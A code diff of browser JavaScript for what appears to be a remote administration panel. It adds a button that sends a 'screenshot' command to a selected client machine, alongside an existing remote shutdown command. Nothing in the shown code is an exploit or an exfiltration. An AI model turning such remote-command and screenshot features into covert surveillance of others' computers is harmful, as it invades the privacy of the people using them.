@@ -2,6 +2,7 @@ const consolebuttons = document.querySelectorAll(".console-button");
 const shutdownbuttons = document.querySelectorAll(".shutdown-button");
 const logbuttons = document.querySelectorAll(".log-button");
 const deletebuttons = document.querySelectorAll(".delete-button");
+const screenshotbuttons = document.querySelectorAll(".screenshot-button");
 
 // For each button, add an event listener that shows or hides its corresponding console
 consolebuttons.forEach((button) => {
@@ -24,13 +25,24 @@ consolebuttons.forEach((button) => {
 
 shutdownbuttons.forEach((button) => {
   button.addEventListener("click", (e) => {
+    const clientid = button.closest(".computer-card").id; //get button computer card
+
     socket.emit("command", {
-      id: e.target.id,
+      id: clientid,
       cmd: "shutdown /i /t 120",
     });
   });
 });
+screenshotbuttons.forEach((button) => {
+  button.addEventListener("click", (e) => {
+    const clientid = button.closest(".computer-card").id; //get button computer card
 
+    socket.emit("command", {
+      id: clientid,
+      cmd: "screenshot",
+    });
+  });
+});
 logbuttons.forEach((button) => {
   button.addEventListener("click", async (e) => {
     const clientname = button
